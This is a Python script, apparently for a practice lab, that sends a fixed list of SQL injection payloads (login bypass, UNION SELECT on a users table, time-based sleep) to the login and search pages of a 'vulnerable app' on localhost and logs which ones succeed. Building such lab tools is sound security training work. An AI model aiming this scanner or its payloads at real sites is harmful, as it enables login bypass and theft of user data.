import requests
import time
import argparse
import os
import shutil

PROJECT_DIR = os.path.dirname(__file__)
DEFAULT_STORAGE = PROJECT_DIR
FALLBACK_STORAGE = os.path.join("D:", "SQLi-playground-data")

storage_root = os.environ.get("SQLI_PLAYGROUND_ROOT")
if not storage_root:
    if os.path.exists(FALLBACK_STORAGE):
        try:
            free_bytes = shutil.disk_usage(PROJECT_DIR).free
        except OSError:
            free_bytes = 0
        if free_bytes < 10 * 1024 * 1024:
            storage_root = FALLBACK_STORAGE
        else:
            storage_root = DEFAULT_STORAGE
    else:
        storage_root = DEFAULT_STORAGE

os.makedirs(storage_root, exist_ok=True)
LOG_PATH = os.path.join(storage_root, "detector.log")

PAYLOADS = [
    "' OR '1'='1", 
    "' OR 1=1 -- ",
    "admin' -- ",
    "' UNION SELECT 1, username, role FROM users -- ",
    "' AND sleep(5) -- ",
]

HEADERS = {
    "User-Agent": "SQLi-Playground-Detector/1.0"
}


def log_detection(entry):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a", encoding="utf-8") as handle:
        handle.write(f"[{timestamp}] {entry}\n")


def detect_login(target):
    url = f"{target.rstrip('/')}/login"
    print(f"Scanning login endpoint: {url}")
    for payload in PAYLOADS:
        data = {"username": payload, "password": "anything"}
        start = time.time()
        try:
            response = requests.post(url, data=data, headers=HEADERS, timeout=10)
        except requests.exceptions.RequestException as err:
            print(f"Request failed: {err}")
            continue
        duration = time.time() - start
        html = response.text.lower()
        if "welcome back" in html or "your role" in html:
            entry = f"Login injection success payload={payload} status={response.status_code} time={duration:.2f}s"
            print(entry)
            log_detection(entry)
        elif "syntax error" in html or "database error" in html or "sqlite" in html:
            entry = f"Login injection error pattern payload={payload} status={response.status_code} time={duration:.2f}s"
            print(entry)
            log_detection(entry)
        elif duration > 4.5:
            entry = f"Login time-based injection suspect payload={payload} status={response.status_code} time={duration:.2f}s"
            print(entry)
            log_detection(entry)


def detect_search(target):
    url = f"{target.rstrip('/')}/search"
    print(f"Scanning search endpoint: {url}")
    for payload in PAYLOADS:
        data = {"q": payload}
        start = time.time()
        try:
            response = requests.post(url, data=data, headers=HEADERS, timeout=10)
        except requests.exceptions.RequestException as err:
            print(f"Request failed: {err}")
            continue
        duration = time.time() - start
        html = response.text.lower()
        if "database error" in html or "syntax error" in html or "sqlite" in html:
            entry = f"Search injection error pattern payload={payload} status={response.status_code} time={duration:.2f}s"
            print(entry)
            log_detection(entry)
        elif payload.strip().startswith("' or") and "role" in html:
            entry = f"Search injection success payload={payload} status={response.status_code} time={duration:.2f}s"
            print(entry)
            log_detection(entry)
        elif duration > 4.5:
            entry = f"Search time-based injection suspect payload={payload} status={response.status_code} time={duration:.2f}s"
            print(entry)
            log_detection(entry)


def show_logs():
    if not os.path.exists(LOG_PATH):
        print("No detector logs found yet.")
        return
    print("\n=== Detector Log ===")
    with open(LOG_PATH, "r", encoding="utf-8") as handle:
        print(handle.read())


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detector for the Playground web app.")
    parser.add_argument("--target", default="http://127.0.0.1:5000", help="Base URL of the vulnerable app")
    args = parser.parse_args()

    choices = {
        "1": ("Scan login page", detect_login),
        "2": ("Scan search page", detect_search),
        "3": ("Show detection log", lambda target: show_logs()),
        "4": ("Exit", None),
    }

    while True:
        print("\nSQLi Detector Menu")
        for key, (label, _) in choices.items():
            print(f" {key}. {label}")
        choice = input("Choose an action: ").strip()
        if choice not in choices:
            print("Invalid choice. Enter 1-4.")
            continue
        if choice == "4":
            print("Exiting detector.")
            break
        _, callback = choices[choice]
        callback(args.target)


if __name__ == "__main__":
    main()
